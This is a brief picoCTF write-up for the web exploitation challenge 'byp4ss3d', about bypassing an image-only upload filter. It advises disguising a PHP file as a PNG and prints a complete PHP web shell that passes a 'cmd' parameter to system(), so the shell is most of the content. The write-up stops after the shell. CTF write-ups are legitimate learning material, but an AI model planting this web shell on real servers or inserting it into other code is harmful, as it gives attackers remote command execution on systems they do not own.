# CTF-Documentation
# CTF Name : pico ctf
# Category : web exploitation
# Challenge Name : byp4ss3d
# Description 
A university's online registration portal asks students to upload their ID cards for verification. The developer put some filters in place to ensure only image files are uploaded but are they enough? Take a look at how the upload is implemented. Maybe there's a way to slip past the checks and interact with the server in ways you shouldn't.
# First step : Discover the web page
<img width="1599" height="778" alt="1" src="https://github.com/user-attachments/assets/07e5a3c2-79ff-4a89-b6a6-608dd3e7762b" />
we can see we can just upload to webpage just 3 file type (JPG, PNG, or GIF)

# What we should do:
we need flag.txt or somthing like that inside we can get our flag 
so we have to write php file and hide it like png file 
and use this file to get webshell on website
you can use this exploit


 <html>
 <body>
 <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
 <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
 <input type="SUBMIT" value="Execute">
 </form>
 <pre>
 <?php
     if(isset($_GET['cmd']))
     {
         system($_GET['cmd'] . ' 2>&1');
     }
 ?>
 </pre>
 </body>
 </html>





